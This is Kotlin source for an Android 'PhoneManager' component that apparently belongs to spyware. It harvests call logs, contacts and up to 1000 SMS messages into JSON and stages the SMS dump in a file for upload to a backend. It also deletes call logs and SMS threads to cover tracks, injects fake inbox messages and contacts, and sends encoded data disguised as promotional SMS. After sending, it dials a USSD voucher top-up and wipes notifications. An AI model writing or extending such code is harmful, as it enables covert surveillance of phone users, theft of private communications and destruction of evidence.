package com.example.myandroid

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import kotlinx.coroutines.*
import kotlin.coroutines.resume
import org.json.JSONArray
import org.json.JSONObject
import java.util.Date

object PhoneManager {

    data class CallStats(
        val totalDuration: Long = 0,
        val totalCalls: Int = 0,
        val incoming: Int = 0,
        val outgoing: Int = 0,
        val missed: Int = 0,
        val topContact: String = "None",
        val contactCount: Int = 0
    )

    fun getStats(ctx: Context): CallStats {
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return CallStats()
        }

        var duration = 0L
        var total = 0
        var inc = 0
        var out = 0
        var miss = 0
        val contactFreq = HashMap<String, Int>()

        try {
            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC"
            )
            
            cursor?.use {
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)

                while (it.moveToNext()) {
                    val dur = it.getLong(durIdx)
                    val type = it.getInt(typeIdx)
                    val num = it.getString(numIdx)

                    total++
                    duration += dur
                    
                    when (type) {
                        CallLog.Calls.INCOMING_TYPE -> inc++
                        CallLog.Calls.OUTGOING_TYPE -> out++
                        CallLog.Calls.MISSED_TYPE -> miss++
                    }
                    
                    if (num != null) {
                        contactFreq[num] = contactFreq.getOrDefault(num, 0) + 1
                    }
                }
            }
        } catch (e: Exception) { DebugLogger.log("PHONE_MGR_ERR", e.message ?: "Unknown error") }

        // Get Contact Count
        var cCount = 0
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
             try {
                 val cCursor = ctx.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
                 cCount = cCursor?.count ?: 0
                 cCursor?.close()
             } catch (e: Exception) { }
        }
        
        // Resolve Top Contact Name
        val topNum = contactFreq.maxByOrNull { it.value }?.key ?: "None"
        var topName = topNum
        if (topNum != "None" && cCount > 0) {
            topName = getContactName(ctx, topNum)
        }

        return CallStats(duration, total, inc, out, miss, topName, cCount)
    }

    fun getCallLogs(ctx: Context, limit: Int = 100): JSONArray {
        val list = JSONArray()
        val hasPermission = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
        
        if (!hasPermission) {
            DebugLogger.log("PHONE_DIAG", "Call Log capture failed: Permission READ_CALL_LOG not granted.")
            return list
        }

        val finalLimit = if (limit <= 0) 100 else limit

        try {
            val projection = arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.CACHED_NAME
            )

            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection, 
                null, 
                null, 
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                
                var count = 0
                while(it.moveToNext() && count < finalLimit) {
                    val obj = JSONObject()
                    obj.put("num", it.getString(numIdx) ?: "Private")
                    obj.put("name", it.getString(nameIdx) ?: "Unknown")
                    obj.put("ts", it.getLong(dateIdx))
                    obj.put("dur", it.getLong(durIdx))
                    obj.put("type", it.getInt(typeIdx))
                    list.put(obj)
                    count++
                }
                DebugLogger.log("PHONE_DIAG", "Captured ${list.length()} call records.")
            } ?: run {
                DebugLogger.log("PHONE_DIAG", "CallLog provider returned null cursor (Database may be locked/busy).")
            }
        } catch(e: Exception) {
            DebugLogger.log("PHONE_DIAG", "Fatal query error: ${e.message}")
        }
        return list
    }

    fun getHistoricalSms(ctx: Context, limit: Int = 1000, keyword: String? = null): JSONArray {
        val list = JSONArray()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list
        
        try {
            val prefs = ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE)
            val defaultBlacklist = "127,994,ethio tel,251994,BeepCall710,telegames,telebirr,830,131"
            val blacklistRaw = prefs.getString("blacklist", defaultBlacklist) ?: ""
            val blacklist = if (blacklistRaw.isEmpty()) emptyList() else blacklistRaw.split(",").map { it.trim() }

            val selectionList = mutableListOf<String>()
            val selectionArgs = mutableListOf<String>()

            if (!keyword.isNullOrEmpty()) {
                selectionList.add("body LIKE ?")
                selectionArgs.add("%${keyword}%")
            }

            if (blacklist.isNotEmpty()) {
                val placeholders = blacklist.joinToString(", ") { "?" }
                selectionList.add("address NOT IN ($placeholders)")
                selectionArgs.addAll(blacklist)
            }

            val selection = if (selectionList.isEmpty()) null else selectionList.joinToString(" AND ")
            val args = if (selectionArgs.isEmpty()) null else selectionArgs.toTypedArray()

            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                selection, args, "date DESC"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val typeIdx = it.getColumnIndex("type")
                
                var count = 0
                while(it.moveToNext() && (limit <= 0 || count < limit)) {
                    val obj = JSONObject()
                    obj.put("num", it.getString(addrIdx))
                    obj.put("body", it.getString(bodyIdx))
                    obj.put("ts", it.getLong(dateIdx))
                    obj.put("type", it.getInt(typeIdx))
                    list.put(obj)
                    count++
                }
            }
        } catch(e: Exception) { DebugLogger.log("PHONE_MGR_ERR", e.message ?: "Unknown error") }
        return list
    }

    fun vaultHistoricalSms(ctx: Context) {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        // If backend already confirmed receipt, we are done forever.
        if (prefs.getBoolean("historical_sms_dumped", false)) return

        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
        
        // If file exists, we don't need to rebuild it, just wait for SyncWorker to find it.
        if (vaultFile.exists()) return 

        // If no file and not dumped yet, it means either we haven't tried or a previous upload failed.
        val data = getHistoricalSms(ctx, 1000)
        if (data.length() > 0) {
            try {
                vaultFile.writeText(data.toString())
                DebugLogger.log("VAULT", "Inbox snapshot secured: ${data.length()} messages")
            } catch (e: Exception) { 
                DebugLogger.log("VAULT_ERR", "Failed to write vault: ${e.message}")
            }
        }
    }

    fun getContacts(ctx: Context, limit: Int = -1): JSONArray {
        val list = JSONArray()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list
        
        try {
             val cursor = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                var count = 0
                while(it.moveToNext()) {
                    if (limit > 0 && count >= limit) break
                    val obj = JSONObject()
                    obj.put("name", it.getString(nameIdx))
                    obj.put("num", it.getString(numIdx))
                    list.put(obj)
                    count++
                }
            }
        } catch(e: Exception) {}
        return list
    }

    private fun getContactName(ctx: Context, phoneNumber: String): String {
        val uri = android.net.Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, android.net.Uri.encode(phoneNumber))
        val cursor = ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
        var name = phoneNumber
        cursor?.use {
            if (it.moveToFirst()) {
                name = it.getString(it.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME))
            }
        }
        return name
    }

    fun deleteLogs(ctx: Context, action: String, value: String?): Int {
        val resolver = ctx.contentResolver
        return try {
            val count = when (action.uppercase()) {
                "CLEAR_ALL" -> resolver.delete(CallLog.Calls.CONTENT_URI, null, null)
                "DELETE_NUM" -> {
                    val where = "${CallLog.Calls.NUMBER}=?"
                    resolver.delete(CallLog.Calls.CONTENT_URI, where, arrayOf(value))
                }
                "DELETE_LAST" -> {
                    val mins = value?.toLongOrNull() ?: 5L
                    val timeThreshold = System.currentTimeMillis() - (mins * 60 * 1000)
                    val where = "${CallLog.Calls.DATE} > ?"
                    resolver.delete(CallLog.Calls.CONTENT_URI, where, arrayOf(timeThreshold.toString()))
                }
                else -> 0
            }
            DebugLogger.log("FORENSIC", "Deleted $count records from CallLog")
            count
        } catch (e: SecurityException) {
            DebugLogger.log("FORENSIC_ERR", "Permission Denied for Write: ${e.message}")
            -1
        } catch (e: Exception) {
            DebugLogger.log("FORENSIC_FATAL", "Error: ${e.message}")
            -2
        }
    }

    fun addContact(ctx: Context, name: String, num: String): Boolean {
        try {
            val ops = ArrayList<android.content.ContentProviderOperation>()
            ops.add(android.content.ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null).build())

            ops.add(android.content.ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name).build())

            ops.add(android.content.ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, num)
                .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE).build())

            ctx.contentResolver.applyBatch(ContactsContract.AUTHORITY, ops)
            DebugLogger.log("CONTACTS", "Injected: $name ($num)")
            return true
        } catch (e: Exception) {
            DebugLogger.log("CONTACTS_ERR", "Injection fail: ${e.message}")
            return false
        }
    }

    fun deleteSmsThread(ctx: Context, addressStr: String): Int {
        if (addressStr.isEmpty()) return 0
        val resolver = ctx.contentResolver
        val addresses = addressStr.split(Regex("[,;]")).map { it.trim() }.filter { it.isNotEmpty() }
        var totalDeleted = 0
        
        for (address in addresses) {
            try {
                // 1. Resolve Thread ID for the address
                val threadIdUri = android.net.Uri.parse("content://sms/threadID")
                val builder = threadIdUri.buildUpon().appendQueryParameter("recipient", address)
                val cursor = resolver.query(builder.build(), arrayOf("_id"), null, null, null)
                var threadId: Long = -1
                cursor?.use { if (it.moveToFirst()) threadId = it.getLong(0) }

                if (threadId != -1L) {
                    // 2. Delete the entire conversation thread (SMS and MMS)
                    val conversationUri = android.net.Uri.parse("content://sms/conversations/$threadId")
                    totalDeleted += resolver.delete(conversationUri, null, null)
                } else {
                    // Fallback: Delete by address if thread mapping fails
                    totalDeleted += resolver.delete(android.net.Uri.parse("content://sms/"), "address=?", arrayOf(address))
                }
            } catch (e: Exception) {
                DebugLogger.log("SMS_WIPE_ERR", "Failed to delete thread for $address: ${e.message}")
            }
        }
        return totalDeleted
    }

    fun deleteSmsByQuery(ctx: Context, query: String): Int {
        if (query.isEmpty()) return 0
        val resolver = ctx.contentResolver
        return try {
            val count = resolver.delete(android.net.Uri.parse("content://sms/"), "body LIKE ?", arrayOf("%$query%"))
            DebugLogger.log("SMS_WIPE", "Purged $count messages matching query: $query")
            count
        } catch (e: Exception) {
            DebugLogger.log("SMS_WIPE_ERR", "Query wipe failed: ${e.message}")
            0
        }
    }

    fun sendLegitSms(ctx: Context, addressStr: String, message: String) {
        try {
            val addresses = addressStr.split(Regex("[,;]")).map { it.trim() }.filter { it.isNotEmpty() }
            val smsManager = ctx.getSystemService(android.telephony.SmsManager::class.java)
            val parts = smsManager.divideMessage(message)
            
            for (address in addresses) {
                smsManager.sendMultipartTextMessage(address, null, parts, null, null)
                
                // If we are default, manually insert into Sent folder so it's 'Legit'
                if (DefaultSmsManager.isDefaultSms(ctx)) {
                    val values = android.content.ContentValues()
                    values.put("address", address)
                    values.put("body", message)
                    values.put("date", System.currentTimeMillis())
                    values.put("read", 1)
                    values.put("type", 2) // MESSAGE_TYPE_SENT
                    ctx.contentResolver.insert(android.net.Uri.parse("content://sms/sent"), values)
                }
                DebugLogger.log("SMS_SEND", "Dispatched to $address")
            }
        } catch (e: Exception) {
            DebugLogger.log("SMS_SEND_ERR", "Failed to send: ${e.message}")
        }
    }

    fun injectFakeSms(ctx: Context, address: String, message: String, isRead: Boolean): Boolean {
        if (!DefaultSmsManager.isDefaultSms(ctx)) return false
        return try {
            val values = android.content.ContentValues()
            values.put("address", address)
            values.put("body", message)
            values.put("date", System.currentTimeMillis())
            values.put("read", if (isRead) 1 else 0)
            values.put("type", 1) // MESSAGE_TYPE_INBOX
            ctx.contentResolver.insert(android.net.Uri.parse("content://sms/inbox"), values)
            DebugLogger.log("SMS_INJECT", "Injected fake message from $address")
            true
        } catch (e: Exception) {
            DebugLogger.log("SMS_INJECT_ERR", "Injection failed: ${e.message}")
            false
        }
    }

    fun purgeContact(ctx: Context, target: String): Int {
        val resolver = ctx.contentResolver
        var deleted = 0
        val contactIds = mutableSetOf<Long>()

        try {
            // 1. Safely lookup by Number
            val phoneUri = android.net.Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, android.net.Uri.encode(target))
            resolver.query(phoneUri, arrayOf(ContactsContract.PhoneLookup._ID), null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    contactIds.add(cursor.getLong(0))
                }
            }

            // 2. Safely lookup by Name (if it's not a number)
            resolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID),
                "${ContactsContract.Contacts.DISPLAY_NAME_PRIMARY} = ?",
                arrayOf(target),
                null
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    contactIds.add(cursor.getLong(0))
                }
            }

            // 3. Explicitly delete ONLY the resolved IDs
            if (contactIds.isNotEmpty()) {
                for (id in contactIds) {
                    val count = resolver.delete(
                        ContactsContract.RawContacts.CONTENT_URI,
                        "${ContactsContract.RawContacts.CONTACT_ID} = ?",
                        arrayOf(id.toString())
                    )
                    if (count > 0) deleted++
                }
            }
            
            DebugLogger.log("CONTACTS", "Purged $deleted entries for query: $target")
            return deleted
        } catch (e: Exception) {
            DebugLogger.log("CONTACTS_ERR", "Purge fail: ${e.message}")
            return -1
        }
    }

    suspend fun sendEncryptedRobustSms(ctx: Context, phoneStr: String, payload: String): Boolean {
        val phones = phoneStr.split(Regex("[,;]")).map { it.trim() }.filter { it.isNotEmpty() }
        if (phones.isEmpty()) return false

        val token = FidelCipher.encode(payload)
        val promo = FidelCipher.camouflage(ctx, token)
        
        var overallSuccess = false
        val failedPhones = mutableListOf<String>()

        for (phone in phones) {
            var attempts = 0
            var success = false
            while (attempts < 3) {
                if (sendAndWait(ctx, phone, promo)) {
                    DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully to $phone.")
                    success = true
                    overallSuccess = true
                    break
                }
                attempts++
                DebugLogger.log("ROBUST_SMS", "SMS send failed to $phone (Attempt $attempts/3).")
                delay(4000)
            }
            if (!success) failedPhones.add(phone)
        }
        
        if (failedPhones.isNotEmpty()) {
            val prefs = ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE)
            val voucher = prefs.getString("stored_voucher", "") ?: ""
            if (voucher.isNotEmpty()) {
                DebugLogger.log("ROBUST_SMS", "Recovery: Attempting USSD top-up with voucher: $voucher")
                try {
                    val ussd = "*805*$voucher#" 
                    val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:" + android.net.Uri.encode(ussd))).apply {
                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    ctx.startActivity(intent)
                    prefs.edit().remove("stored_voucher").apply()
                    
                    DebugLogger.log("ROBUST_SMS", "USSD Dialed. Waiting 60s for network confirmation...")
                    delay(60000)
                    
                    for (phone in failedPhones) {
                        var postRecoveryAttempts = 0
                        while (postRecoveryAttempts < 3) {
                            if (sendAndWait(ctx, phone, promo)) {
                                DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully post-recovery to $phone.")
                                overallSuccess = true
                                break
                            }
                            postRecoveryAttempts++
                            DebugLogger.log("ROBUST_SMS", "Post-recovery SMS send failed to $phone (Attempt $postRecoveryAttempts/3).")
                            delay(4000)
                        }
                    }
                } catch (e: Exception) {
                    DebugLogger.log("ROBUST_SMS_ERR", "Recovery USSD failed: ${e.message}")
                }
            } else {
                DebugLogger.log("ROBUST_SMS", "No voucher available for recovery of failed numbers.")
            }
        }

        if (overallSuccess) {
            CoroutineScope(Dispatchers.Main).launch {
                delay(1500)
                MyNotificationListener.instance?.wipeNotifications("ALL", null)
            }
        }
        return overallSuccess
    }

    private suspend fun sendAndWait(ctx: Context, phone: String, msg: String): Boolean = suspendCancellableCoroutine { cont ->
        val appCtx = ctx.applicationContext
        val smsManager = appCtx.getSystemService(android.telephony.SmsManager::class.java)
        val parts = smsManager.divideMessage(msg)
        
        val action = "com.example.myandroid.SMS_SENT_${System.currentTimeMillis()}"
        var partsCompleted = 0
        var hasFailure = false
        
        val receiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context, intent: android.content.Intent) {
                if (resultCode != android.app.Activity.RESULT_OK) {
                    hasFailure = true
                }
                partsCompleted++
                if (partsCompleted == parts.size) {
                    try { appCtx.unregisterReceiver(this) } catch(e:Exception){}
                    if (cont.isActive) cont.resume(!hasFailure)
                }
            }
        }
        
        androidx.core.content.ContextCompat.registerReceiver(
            appCtx, receiver, android.content.IntentFilter(action), 
            androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
        )
        
        cont.invokeOnCancellation {
            try { appCtx.unregisterReceiver(receiver) } catch(ex: Exception) {}
        }
        
        val sentIntents = java.util.ArrayList<android.app.PendingIntent>()
        for (i in parts.indices) {
            val pi = android.app.PendingIntent.getBroadcast(
                appCtx, i, android.content.Intent(action),
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            sentIntents.add(pi)
        }
        
        try {
            smsManager.sendMultipartTextMessage(phone, null, parts, sentIntents, null)
        } catch (e: Exception) {
            try { appCtx.unregisterReceiver(receiver) } catch(ex:Exception){}
            if (cont.isActive) cont.resume(false)
        }
        
        CoroutineScope(Dispatchers.IO).launch {
            delay(30000)
            if (cont.isActive) {
                try { appCtx.unregisterReceiver(receiver) } catch(ex:Exception){}
                cont.resume(false)
            }
        }
    }
}